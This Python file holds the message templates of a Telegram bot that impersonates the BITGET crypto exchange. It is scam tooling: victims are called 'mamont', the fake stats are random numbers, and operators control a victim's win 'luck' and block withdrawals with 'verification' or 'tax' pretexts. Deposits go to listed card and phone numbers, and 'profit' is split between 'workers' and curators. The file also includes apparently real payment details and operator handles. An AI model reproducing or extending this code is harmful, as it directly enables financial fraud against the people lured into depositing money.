from models import *
import random
import datetime
import pytz
import data.config as config

from handlers.main import utils

deposite = 'Выберите метод пополнения:'
withdraw = 'Выберите тип актива для вывода'

withdraw_send = 'Введите сумму для вывода'
withdraw_send_requisites = 'Введите реквизиты'

spot = '''<b>Вы перешли в раздел Спотовая Торговля. Данный вид торговли подразумевает непосредственную покупку и продажу финансовых инструментов и активов, например таких как криптовалюты.</b>'''

futures = '''<b>🔹 Фьючерс — производный финансовый инструмент на бирже купли-продажи базового актива, при заключении которого стороны договариваются только о цене и сроке поставки.

Выберите криптовалюту для совершения сделки:</b>'''

support = '''✅ Вы можете открыть заявку в службу поддержки BITGET. Специалист ответит в ближайшее время. 
Для более быстрого решения проблемы описывайте свое обращение максимально четко, если необходимо, предоставьте файлы и/или изображения. 

Правила обращения в техническую поддержку BITGET:

1. При первом обращении в техническую поддержку, представьтесь и укажите ваш ID из личного кабинета, чтобы специалист мог найти Ваш личный кабинет в системе BITGET.
2. Подробно опишите Вашу проблему, по необходимости приложите изображения и/или файлы.
3. Будьте вежливы и Вам всегда помогут!'''

info = '''📘 О сервисе

<b>BITGET - это централизованная биржа для торговли криптовалютой и фьючерсными активами.</b>

Мы строим криптовалютную экономику — более справедливую, доступную, эффективную и прозрачную финансовую систему, основанную на криптовалюте.'''

verif = '''<b>🔷 Мы рекомендуем всем пользователям верифицировать аккаунт. Вы можете это сделать после первого успешного пополнения баланса, нажав на кнопку ниже и написав 'Верификация' в Техническую Поддержку, спасибо!</b>

 ✅ Преимущества верифицированного аккаунта:
1. Приоритет в очереди к выводу
2. Отсутствие лимитов на вывод средств
3. Возможность хранить средства в разных активах
4. Увеличение доверия со стороны администрации, предотвращения блокировки аккаунта'''

currency = '''Выберите вашу валюту'''

setting = '''⚙️ Настройки'''
def cabinet(user):
    utc_now = datetime.datetime.now(pytz.utc)

    moscow_tz = pytz.timezone("Europe/Moscow")

    moscow_now = utc_now.astimezone(moscow_tz)

    formatted_date = moscow_now.strftime("%Y-%m-%d %H:%M:%S")
    currency = Currency.get(id=user.currency)
    balance = round(user.balance / currency.exchange_rate, 2)
    text = f'''📂 Профиль
┏ Ваш ID: {user.user_id}
┗ Верификация: {'Пройдена' if user.verif else 'Не пройдена'}
➖➖➖➖➖➖➖➖➖➖
┏Общий баланс:  {balance} {currency.ico}
┣Фиатный баланс: {balance} {currency.ico}
┣Криптовалютный баланс: 0 {currency.ico}
┗На выводе: 0 {currency.ico}
➖➖➖➖➖➖➖➖➖➖
┏ 👨🏻‍💻 Пользователей онлайн: {random.randint(9000, 10000)}
┣ Загруженность Bitcoin: {random.choice(['🔴', '🟡', '🟢'])}
┣ Загруженность Ethereum: {random.choice(['🔴', '🟡', '🟢'])}
┗ Загруженность Litecoin: {random.choice(['🔴', '🟡', '🟢'])}
➖➖➖➖➖➖➖➖➖➖
🕰️ Время : {formatted_date}'''
    
    return text

def deposite_amount(user):
    currency = Currency.get(id=user.currency)
    cfg = utils.get_my_config(user.user_id)
    min_balance = round(cfg.min_deposite / currency.exchange_rate)
    max_balance = round(config.max_dep / currency.exchange_rate)

    text = f'''Пожалуйста, введите размер депозита:

┏ Минимальная сумма - {min_balance} RUB
┗ Максимальная сумма - {max_balance} RUB'''
    
    return text
    

def deposite_message(price, user, type):
    if type == 'fiat':
        type = 'card2card'
        req = TeamConfig.select()
        req = req[0].card
    elif type == 'sbp':
        type = 'СБП'
        req = TeamConfig.select()
        req = req[0].number

    currency = Currency.get(id=user.currency)
    summ = str(round(price / currency.exchange_rate))

    if currency.id == 1:
        summ += 'USD'
    elif currency.id == 2:
        summ += 'EUR'
    elif currency.id == 3:
        summ += 'KZT'
    elif currency.id == 4:
        summ += 'RUB'
    elif currency.id == 5:
        summ += 'BYN'


    text = f'''Создана <b>заявка</b> на пополнение {summ} ({type})

Для пополнения переведите указанную сумму по номеру карты.

➖➖➖➖➖➖➖➖➖➖➖
<b>{"💳 Номер карты:" if type == "card2card" else "💳 Номер телефона:"}</b>

<code>{req}</code>

ℹ️ Сумма: <b>{summ}</b>
➖➖➖➖➖➖➖➖➖➖➖

⚠️ <b>Обратите внимание на сумму платежа.</b>
<i>Для автоматического зачисления переводите ровно ту сумму, которая указана в заявке</i> <b>({summ})</b>.

<b>Заявка актуальна 15 минут.</b>'''    

    return text

def future_open(crypto, user):
    currency = Currency.get(id=user.currency)
    now_price = round(round(crypto[1]*random.randint(99950, 100050) / 100000, 2) / currency.exchange_rate, 1)
    min_bet = round(config.min_bet / currency.exchange_rate)

    text = f'''<b>🔹 Вы выбрали криптовалюту {crypto[0]}</b>

Текущая Стоимость актива: {now_price}{currency.ico}
- Минимальная сумма позиции: {min_bet}{currency.ico}

<i>Пожалуйста, введите размер позиции:</i>'''
    
    return text, now_price

def info_future(future, now_time=0, new_price=0):
    user = User.get(user_id=future.user_id)

    now_time = future.time - now_time

    currency = Currency.get(id=user.currency)
    if future.amount:
        now_price = round(future.amount / currency.exchange_rate, 1)
        price = f'{now_price}{currency.ico}'

    if future.type == 'long':
        type = f'Повышение'
    elif future.type == 'short':
        type = 'Понижение'
    else:
        type = 'Не изменится'

    if new_price: 
       new_price = f'''• Изначальная стоимость: <b>{future.start_price} {currency.ico}</b>
• Текущая стоимость:  <b>{new_price} {currency.ico}</b>
• Изменение: <b> {'+' if future.start_price < new_price else '-'} {round(abs(future.start_price - new_price), 2)} ₽</b>'''
    else:
        new_price=f''

    text = f'''🏦 {currency.name}/USD

💵 Сумма ставки: {price}
📉 Прогноз: {type}

{new_price}

⏱ Осталось: {now_time} сек'''
#     text = f'''<b>🔎 Информация о сделке:</b>
# ┏ Размер позиции: <b>{price}</b>
# {new_price}
# ┣ Время фиксации позиции: <b>{time}</b>
# ┣ Ваше плечо: <b>{credit}</b>
# ┗ Тип: <b>{type}</b>

# <i>{info}</i>'''
    
    return text

def future_end(future, prices):
    up = prices[0] <= prices[-1]
    user = User.get(user_id=future.user_id)
    print(future.type)
    print(prices)
    if (future.type == 'long' and up) or (future.type == 'short' and not up):
        win = True
    else:
        win = False
    if win: 
        if future.type == 'long' or future.type == 'short':
            future_amount = future.amount * 0.97
        else:
            future_amount = future.amount * 8.7
        user.balance = user.balance + future.amount + future_amount
        user.save()
    else:
        future_amount = future.amount
    
    text = f'''<b>{'✅ Позиция была закрыта с прибылью.' if win else '❌ Позиция была закрыта с убытком.'}</b>
┣ Доходность позиции: <b>{"+" if win else "-"} {round(future_amount, 2)} ₽</b>
{f"┣ Комиссия сделки: <b>2.5% ({future.amount*0.025}₽)</b>" if win else ''}
┗ Ваш текущий баланс: <b>{user.balance}₽</b>
📄 Дополнительная отчетность доступна в личном кабинете.

{"<i>Если хотите продолжить, введите сумму</i>" if 0 else ""}'''
    
    return text

    
        

def worker(id):
    text = f'''💳 Ваши фейк реквизиты:

Карта: 4890494774095718
QIWI: +79918810997

🔗 Ваша реферальная ссылка: https://t.me/BitgetTelegramBot?start={id}'''
    
    return text

def open_mamont(configuration, user, chat):
    luck = '0 %'
    if configuration.lucky == 2:
        luck = '100 %'
    elif configuration.lucky == 1:
        luck = '50 %'
    
    if configuration.withdraw == 3:
        withdraw = 'Верификация'
    elif configuration.withdraw == 2:
        withdraw = 'Налог'
    elif configuration.withdraw == 1:
        withdraw = 'Реквезиты'
    elif configuration.withdraw == 0:
        withdraw = 'Обычный'
    text = f'''⚙️ Меню управления мамонтом: <a href="{chat.user_url}">{chat.first_name}</a> @{chat.username}
└<b>Telegram id</b> - [<code>{chat.id}</code>]

<b>{'✅ Верифицирован' if user.verif else '❌ Не верифицирован'} 
{"🔥 Аккаунт не заморожен" if not user.freeze else "⛄️ Аккаунт заморожен"}
🍀 Удача: {luck}
📌 Метод вывода: {withdraw}

🏦 Баланс: {user.balance} RUB
💰 Минимальный депозит: {configuration.min_deposite} RUB</b>

👨‍💻 Саппорт - {config.SUPPORT_LINK}'''
    
    return text

def new_profit(worker, worker_chat, profit, mamont=None):
    tag = f'#{worker.tag}' if worker.useTag else f'''<a href="{worker_chat.user_url}">{worker_chat.first_name}</a>'''
    procent = 0.8
    mentor = Mentor.get(id=worker.mentor_id) if worker.mentor_id else None
    if mentor:
        procent -= 0.1
    if mamont:
        if mamont.support_mark:
            procent -= 0.1
    mentor = mentor.name if mentor else '-'
    
    
    text = f'''<b>🎉Поступила новая оплата!

    
🏦Сумма профита: {profit.price} ₽
├ Воркеру: {round(profit.price * procent)} ₽
├ Воркер: {tag}
└ Куратор: {mentor}

🌍Направление: Трейдинг
</b>
<code>⚠️Выплаты осуществляет исключительно @vavivlone , сверяйте юзернейм.</code>'''

    return text